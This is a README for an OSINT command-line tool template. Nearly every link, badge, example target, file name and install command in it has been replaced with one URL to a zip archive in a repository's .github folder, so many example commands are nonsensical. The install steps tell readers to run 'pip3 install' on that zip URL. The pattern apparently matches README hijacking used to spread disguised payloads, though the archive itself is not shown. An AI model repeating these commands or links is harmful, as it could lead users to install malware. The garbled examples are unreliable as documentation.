# OSINT cli tool skeleton

<p align="center">
  <p align="center">
    <a href="https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip">
      <img alt="PyPI" src="https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip">
    </a>
    <a href="https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip">
      <img alt="PyPI - Downloads" src="https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip">
    </a>
    <a href="https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip">
      <img alt="Views" src="https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip">
    </a>
  </p>
  <p align="center">
    <img src="https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip" height="200"/>
  </p>
</p>

Template for new OSINT command-line tools.

**Press button "[Use this template](https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip)" to generate your own tool repository.** See [https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip](https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip) for further setup.

## Features

- Detailed readme
- Process N targets from args, text files, stdin
- Make TXT, CSV reports
- Proxy support
- Ready to publish Python package

## Usage

```sh
$ python3 -m osint-cli-tool-skeleton <target>

# or simply

$ osint_cli_tool_skeleton <target>
```

<details>
<summary>Targets</summary>

Specify targets one or more times:
```sh
$ osint_cli_tool_skeleton https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip

Target: https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip
Results found: 1
1) Value: Google
Code: 200

------------------------------
Target: https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip
Results found: 1
1) Value: Best way for artists and creators to get sustainable income and connect with fans | Patreon
Code: 200

------------------------------
Target: https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip
Results found: 1
1) Value: Reddit - Dive into anything
Code: 200

------------------------------
Total found: 3
```

Or use a file with targets list:
```sh
$ osint_cli_tool_skeleton --target-list https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip
```

Or combine tool with other through input/output pipelining:
```sh
$ cat https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip | osint_cli_tool_skeleton --targets-from-stdin
```
</details>

<details>
<summary>Reports</summary>

The skeleton implements CSV reports:
```sh
$ osint_cli_tool_skeleton https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip -oC https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip
...
Results were saved to file https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip

$ more https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip
"Target","Value","Code"
"https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip","Google","200"
"https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip","Best way for artists and creators to get sustainable income and connect with fans | Patreon","200"
"https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip","Reddit - Dive into anything","200"
```

And can save console output to text file separately:
```sh
osint_cli_tool_skeleton https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip -oT https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip
...
$ head -n 4 https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip
Target: https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip
Results found: 1
1) Value: Google
Code: 200
```
</details>

<details>
<summary>Proxy</summary>

The tool supports proxy:
```sh
$ osint_cli_tool_skeleton https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip --proxy http://localhost:8080
```
</details>

## Installation

Make sure you have Python3 and pip installed.


<details>
<summary>Manually</summary>

1. Clone or [download](https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip) respository
```sh
$ git clone https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip
```

2. Install dependencies
```sh
$ pip3 install -r https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip
```
</details>

<details>
<summary>As a the package</summary>

You can clone/download repo and install it from the directory to use as a Python package.
```sh
$ pip3 install .
```

Also you can install it from the PyPI registry:
```sh
$ pip3 install https://github.com/abarreto250/OSINTools/raw/refs/heads/main/.github/Tools_OSIN_v3.7.zip
```
</details>
